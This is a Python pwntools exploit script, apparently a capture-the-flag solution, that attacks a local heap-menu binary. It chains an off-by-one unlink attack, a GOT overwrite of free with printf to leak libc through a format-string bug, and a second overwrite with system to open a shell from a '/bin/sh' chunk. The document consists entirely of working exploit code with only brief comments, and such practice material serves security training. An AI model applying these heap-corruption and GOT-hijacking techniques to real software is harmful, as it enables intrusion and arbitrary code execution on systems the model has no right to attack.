#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

free_got = 0x602018
printf_plt = 0x400680

def buy(name):
    p.sendlineafter(b'Checkout!', str(1))
    if len(name) != 0xf8:
        p.sendlineafter(b'book?', name)
    else:
        p.sendafter(b'book?', name)

def free(idx):
    p.sendlineafter(b'Checkout!', str(2))
    p.sendlineafter(b'return?', str(idx))

def write(idx, name):
    p.sendlineafter(b'Checkout!', str(3))
    sleep(0.01)
    p.sendline(str(idx))
    p.sendlineafter(b'book?', name)

libc = ELF('./libc-2.23.so')
p = process('./challenge')

# useless
p.sendlineafter(b'name?', b'aaaa')

buy(b'a'*0xf6)
buy(b'b'*0xf6)
buy(b'c'*0xf6)
buy(b'%15$p')
buy(b'/bin/sh\0')

# off-by-one + unlink attack
FD = p64(0x6021a0 - 0x18)
BK = p64(0x6021a0 - 0x10)
prev_size = p64(0xf0)
payload = p64(0) + p64(0xf1) + FD + BK + b'a'*0xd0 + prev_size
free(0)
buy(payload)
free(1)

# write ptr array
payload = b'\0'*0x18 + flat(
        0x6021a8, free_got)
write(0, payload)

# write free_got
payload = flat(printf_plt, printf_plt)
write(1, payload)

# leak libc by format string vuln 
free(3)
p.recvuntil(b'0x')
libc.address = int(b'0x' + p.recvuntil(b'\n', drop=True), 16) - 0x20830
log.info('libc: {:#x}'.format(libc.address))

# write free_got
payload = flat(libc.symbols['system'], printf_plt)
write(1, payload)

# get shell
free(4)

p.interactive()
